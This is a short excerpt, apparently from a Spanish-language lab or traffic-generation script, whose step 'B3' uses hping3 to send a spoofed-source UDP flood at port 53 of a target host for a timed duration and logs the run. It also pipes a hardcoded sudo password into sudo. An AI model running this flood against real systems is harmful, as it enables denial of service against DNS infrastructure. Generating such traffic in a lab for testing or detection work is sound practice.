...
HORA_INICIO="$(date +%T)"
echo "Iniciando B3 UDP flood → ${DESTINO}:53 por ${DURACION_SEGUNDOS}s"

echo cisco123 | sudo -S timeout "$DURACION_SEGUNDOS" \
  hping3 --udp -p 53 -i u5000 --rand-source "$DESTINO" 2>/dev/null || true
...
echo "B3 completado | Inicio: $HORA_INICIO | Fin: $HORA_FIN | Archivo: $ARCHIVO_SALIDA"
